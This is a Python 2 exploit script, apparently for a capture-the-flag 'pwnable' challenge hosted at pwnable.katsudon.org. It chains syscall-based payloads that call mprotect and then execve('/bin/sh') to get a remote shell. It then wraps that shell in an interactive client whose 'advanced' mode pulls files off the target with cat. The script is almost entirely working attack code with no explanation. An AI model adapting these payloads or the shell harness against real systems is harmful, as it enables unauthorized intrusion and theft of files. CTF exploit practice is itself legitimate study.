#!/usr/bin/env python
from struct import *
import sys
import socket
from time import sleep

rhp     = ("pwnable.katsudon.org",28099)
sh      = "/bin/sh"

addr_syscall    = 0x08048080
addr_read       = 0x080480a9
addr_exit       = 0x080480df

elf_head       = 0x08048000

sys_execve      = 0x0b
sys_mprotect    = 0x7d
length          = 0x1000
null            = 0x0

#==========

nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(0.5)
nc.connect(rhp)

exploit_st1 =   "\x00"*0x10
exploit_st1 +=  pack("<I", addr_syscall)
exploit_st1 +=  pack("<I", addr_read-0x2)
exploit_st1 +=  pack("<I", elf_head)
exploit_st1 +=  pack("<I", length)
exploit_st1 +=  pack("<I", 0x7)
exploit_st1 +=  "\x00"*(sys_mprotect-len(exploit_st1))

exploit_st2 =   "\x00"*0x10
exploit_st2 +=  pack("<I", addr_syscall)    #$ecx=addr_stack
exploit_st2 +=  pack("<I", addr_read)
exploit_st2 +=  pack("<I", null)
exploit_st2 +=  pack("<I", elf_head)
exploit_st2 +=  pack("<I", null)
exploit_st2 +=  pack("<I", null)
exploit_st2 +=  pack("<I", addr_syscall)
exploit_st2 +=  pack("<I", addr_exit)
exploit_st2 +=  pack("<I", elf_head)
exploit_st2 +=  pack("<I", null)
exploit_st2 +=  pack("<I", null)

#open('exploit_st1','wb').write(exploit_st1)
#open('exploit_st2','wb').write(exploit_st2)
#open('shstr','wb').write(sh+"\x00"*(sys_execve-len(sh)))

nc.recv(8)
nc.sendall(exploit_st1)
sleep(1)
nc.sendall(exploit_st2)
sleep(1)
nc.sendall(sh+"\x00"*(sys_execve-len(sh)))

#==========
def ad_shell(cmd):
    if len(cmd)>0:
        nc.sendall(cmd + " 2>&1\x0a")
        
    rsp = ""
    try:
        while True:
            rsp += nc.recv(1024)
    except:
        True
    finally:
        return rsp

def advanced(nc):
    whoami = ad_shell('whoami').split('\n')[0]
    hostname = ad_shell('hostname').split('\n')[0]
    pwd = ad_shell('pwd').split('\n')[0]

    while True:
        cmd = raw_input('[%s@%s %s]$ ' % (whoami,hostname,pwd))
        if cmd.split(' ')[0]=='GET':
            fname = cmd.split(' ')[1]
            data = ad_shell('cat %s' % fname)
            if len(data)>0:
                open(fname.split('/')[-1],'wb').write(data)
                print '"%s" download succeeded!' % fname
            else:
                print 'download failed...'
                
        elif cmd.split(' ')[0]=='cd':
            ad_shell(cmd)
            pwd = ad_shell('pwd')[:-1]
        elif cmd.split(' ')[0]=='exit':
            nc.sendall("exit\x0a")
            break
        else:
            print ad_shell(cmd)

def normal(nc):
    while True:
        cmd = raw_input("$")
        if len(cmd)>0:
            nc.sendall(cmd + " 2>&1\x0a")

        if cmd!="exit":
            rsp = ""
            try:
                while len(rsp)%1024==0:
                    rsp += nc.recv(1024)
            except:
                rsp += "Response Timeout"
            finally:
                print rsp
        else:
            nc.sendall("exit\x0a")
            break
        
if __name__=='__main__':
    if raw_input('Advanced mode?(Y/others)...')=='Y':
        advanced(nc)
    else:
        normal(nc)
    nc.close()

#==========
